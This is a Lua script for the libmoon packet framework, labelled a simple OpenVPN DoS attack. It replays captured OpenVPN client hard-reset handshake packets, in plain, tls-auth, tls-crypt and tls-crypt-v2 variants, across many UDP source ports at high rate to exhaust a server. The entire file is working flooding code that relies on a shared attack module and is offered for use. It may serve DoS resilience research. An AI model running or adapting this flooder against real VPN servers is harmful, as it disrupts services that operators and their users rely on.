--- A simple OpenVPN DoS attack
local lm = require "libmoon"
local log = require "log"
local memory = require "memory"
local stats = require "stats"
local pcap = require "pcap"
local arp = require "proto.arp"
local eth = require "proto.ethernet"
local pcap = require "pcap"
local ns = require "namespaces"

local openvpn = require "proto.openvpn"

local attack = require "attack"

local ffi = require "ffi"
local format = string.format

local PKT_LEN = 60

-- the configure function is called on startup with a pre-initialized command line parser
function configure(parser)
	attack.configure_pars(parser)
	parser:description("OpenVPN.")
	parser:option("--flows", "Number of flows to be used. Requries udpSrc (to define the first port)."):args(1):convert(tonumber):default(1)
	parser:option("--pchrcv2Pcap", "P_CONTROL_HARD_RESET_CLIENT_V2 pcap file."):args(1)
	parser:option("--pchrcv2TlsAuthPcap", "P_CONTROL_HARD_RESET_CLIENT_V2 pcap file with tls-auth."):args(1)
	parser:option("--pchrcv2TlsCryptPcap", "P_CONTROL_HARD_RESET_CLIENT_V2 pcap file with tls-crypt."):args(1)
	parser:option("--pchrcv3TlsCryptV2Pcap", "P_CONTROL_HARD_RESET_CLIENT_V2 pcap file with tls-crypt-v2."):args(1)

	return parser:parse()
end

master = attack.main
rxTask = attack.rxTask

function txTask(threadId, queue, args)

	local slowRate = false
	local lastSent = 0
	if args.rate < 100 then
		slowRate = args.queueRate
	end


	local mempool = memory:createMemPool()
	local bufs = mempool:bufArray()

	local flowCounter = 0
	local pkts = createPkts(args, mempool)

	attack.txTask_sync_start(args)

	while lm.running() do -- check if Ctrl+c was pressed
		if slowRate then
			bufs:allocN(400, 1)
		else
			bufs:alloc(400)
		end
		local sizeSum = 0

		for i, buf in ipairs(bufs) do

			local pkt = buf:getRawPacket()
			ffi.copy(pkt, pkts[flowCounter + 1].pkt, pkts[flowCounter + 1].size)
			flowCounter = (flowCounter + 1) % (args.flows or 1)

			buf:setSize(pkts[flowCounter + 1].size)

			sizeSum = sizeSum + buf:getSize()

			attack.txTask_setChecksumOffloading(buf, args)

			if captureCtr then
				captureCtr:countPacket(buf)
			end
		end

		if slowRate then
			local now = lm.getTime()
			local sizeBit = sizeSum * 8

			while (sizeBit / (now - lastSent)) > slowRate * 1000000 do
				now = lm.getTime()
			end
			lastSent = now
		end

		attack.txTask_send(queue, bufs)

		if captureCtr then
			captureCtr:update()
		end
	
	end

	if captureCtr then
		captureCtr:finalize()
	end

	log:info("Terminate txTask.")
end

function createPkt(args, mempool)
	mempool = mempool or memory:createMemPool()

	local bufArray = mempool:bufArray()

	local pcapFile = args.pchrcv2Pcap or args.pchrcv2TlsAuthPcap or args.pchrcv2TlsCryptPcap  or args.pchrcv3TlsCryptV2Pcap

	if pcapFile then
		local pcapReader = pcap:newReader(pcapFile)
		local n = pcapReader:read(bufArray)
		if n == 0 then
			pcapReader:reset()
		end
		pcapReader:close()

		attack.modifyPacket(bufArray[1], args)
	end

	local buf = bufArray[1]
	local pkt = buf:getRawPacket()

	local pktLength = buf.pkt_len

	-- raw packet
	local res = ffi.new("uint8_t [?]", pktLength)
	ffi.copy(res, pkt, pktLength)

	bufArray:freeAll()

	return res, pktLength
end

function createPkts(args, mempool)
	mempool = mempool or memory:createMemPool()

	local pkts = {}

	if args.flows then
		local argsUdpSrc = args.udpSrc
		for i = 1, args.flows do
			args.udpSrc = argsUdpSrc + (i - 1)
			local pkt, size = createPkt(args, mempool)
			pkts[i] = {pkt=pkt, size= size}
		end
		args.udpSrc = argsUdpSrc
	else
		local pkt, size = createPkt(args, mempool)
		pkts[1] = {pkt=pkt, size= size}
	end

	return pkts
end
